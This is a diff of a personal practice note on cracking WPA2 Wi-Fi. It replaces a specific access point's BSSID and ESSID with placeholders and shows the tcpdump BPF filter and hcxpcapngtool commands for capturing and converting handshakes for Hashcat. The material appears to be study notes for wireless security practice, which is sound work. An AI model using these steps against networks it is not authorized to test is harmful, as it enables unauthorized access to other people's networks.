@@ -1,9 +1,9 @@
-# Wi‑Fi WPA2 Hacking (hcxdumptool / hcxpcapngtool)
+# Wi‑Fi WPA2 Hacking - hcxdumptool
 
 ## Metadata
-- **BSSID:** B0:EA:BC:13:F8:20  (b0eabc13f820)
+- **BSSID:** MAC  (MAC-no-colons)
 - **Channel:** 11
-- **ESSID:** WN-13F820
+- **ESSID:** WIFI-NAME
 
 ## 🧠 S — Summary
 Capture WPA2 authentication traffic (handshake/PMKIDs) from a target AP using `hcxdumptool`, convert captures to Hashcat format with `hcxpcapngtool`, and crack with Hashcat/other tools.
@@ -19,7 +19,7 @@ Capture WPA2 authentication traffic (handshake/PMKIDs) from a target AP using `h
 Create a BPF file filtering frames for the target BSSID and broadcast:
 
 ```bash
-sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 b0eabc13f820 or wlan addr3 ffffffffffff" -ddd > attack.bpf
+sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 <MAC> or wlan addr3 ffffffffffff" -ddd > attack.bpf
 ```
 
 Use `hcxdumptool` to capture on the monitor interface (example uses channel 11):
@@ -46,7 +46,7 @@ hcxpcapngtool -o hash.hc22000 <dumpfile>.pcapng
 ```
 
 Notes:
-- Ensure the BPF uses the target BSSID (replace `b0eabc13f820` with your target).
+- Ensure the BPF uses the target BSSID (replace `MAC` with your target).
 
 ## ✏️ P — Practice Notes
 - Write the target BSSID, channel, and ESSID before capturing.
